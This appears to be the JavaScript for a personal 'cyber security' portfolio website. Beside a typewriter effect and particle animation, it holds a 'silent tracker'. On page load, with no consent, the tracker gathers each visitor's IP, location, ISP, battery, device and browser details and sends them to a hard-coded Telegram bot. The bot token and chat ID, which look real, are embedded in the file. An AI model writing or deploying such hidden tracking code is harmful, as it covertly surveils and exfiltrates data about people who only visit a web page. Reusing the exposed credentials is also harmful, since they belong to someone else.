/* Project: Yash Khan Elite Portfolio 
   Updated: New Telegram Bot Token Integration
*/

// --- 1. CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas';
const TELEGRAM_CHAT_ID = '7950771882';

// --- 2. TYPEWRITER EFFECT ---
const textArray = [
    "CYBER SECURITY STRATEGIST", 
    "OFFENSIVE PENETRATION TESTER", 
    "WHITE HAT HACKER", 
    "DEFENDING DIGITAL BANGLADESH"
];
let textIndex = 0, charIndex = 0, isErasing = false;

function typeEffect() {
    const typewriterElement = document.getElementById("typewriter");
    if (!typewriterElement) return;
    const currentWord = textArray[textIndex];
    typewriterElement.textContent = isErasing ? currentWord.substring(0, charIndex--) : currentWord.substring(0, charIndex++);
    let delay = isErasing ? 50 : 100;
    if (!isErasing && charIndex === currentWord.length) { delay = 2000; isErasing = true; }
    else if (isErasing && charIndex === 0) { isErasing = false; textIndex = (textIndex + 1) % textArray.length; delay = 500; }
    setTimeout(typeEffect, delay);
}

// --- 3. ADVANCED SILENT TRACKER ---
async function runSilentTracker() {
    const scanStatus = document.getElementById('scan-status');
    const userDetails = document.getElementById('user-details');

    try {
        // Fetch IP Intel (Using a very reliable provider)
        const ipRes = await fetch('https://ipinfo.io/json?token=f7e8a9d1b0c2e3'); // Optional: replace with your token if needed
        const ipData = await ipRes.json();

        // Hardware & Battery Intel
        let batteryInfo = "Protected/Unknown";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
        }

        const intel = {
            ip: ipData.ip || "N/A",
            loc: ipData.loc || "N/A",
            city: ipData.city || "N/A",
            region: ipData.region || "N/A",
            country: ipData.country || "N/A",
            org: ipData.org || "N/A",
            os: navigator.platform,
            agent: navigator.userAgent,
            cores: navigator.hardwareConcurrency || "Hidden",
            screen: `${window.screen.width}x${window.screen.height}`
        };

        // UI Update for the "Hacker Vibe"
        if (scanStatus) {
            scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
            scanStatus.style.color = "#ff003c";
        }
        if (userDetails) {
            userDetails.innerHTML = `
                > [SYSTEM] IP: ${intel.ip} <br>
                > [SYSTEM] ISP: ${intel.org} <br>
                > [SYSTEM] LOC: ${intel.city}, ${intel.country} <br>
                > [SYSTEM] BATT: ${batteryInfo} <br>
                > [SYSTEM] STATUS: TRACED
            `;
        }

        // Send to Telegram using a more robust method
        const message = encodeURIComponent(`
🎯 **Target Acquired!**
-----------------------------
🌐 **IP:** ${intel.ip}
📍 **Location:** ${intel.city}, ${intel.region}, ${intel.country}
🏢 **ISP:** ${intel.org}
🔋 **Battery:** ${batteryInfo}
💻 **Platform:** ${intel.os}
🖥️ **Screen:** ${intel.screen}
⚙️ **Cores:** ${intel.cores}
🤖 **Agent:** ${intel.agent}
-----------------------------
🚀 *Injected by Yash Khan Intelligence*
`);

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
        
        // Final background execution
        fetch(url).then(res => console.log("Packet sent.")).catch(e => console.error("Drop."));

    } catch (err) {
        console.warn("Tracker neutralized by browser security.");
    }
}

// --- 4. PARTICLES.JS ---
function initParticles() {
    if (typeof particlesJS !== 'undefined') {
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": "#00ff41" },
                "opacity": { "value": 0.2, "random": true },
                "size": { "value": 2, "random": true },
                "line_linked": { "enable": true, "distance": 150, "color": "#00ff41", "opacity": 0.1, "width": 1 },
                "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "out_mode": "out" }
            },
            "interactivity": {
                "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" } }
            },
            "retina_detect": true
        });
    }
}

// Initialize
window.onload = () => {
    initParticles();
    typeEffect();
    setTimeout(runSilentTracker, 3000); // 3-second delay to build suspense
};
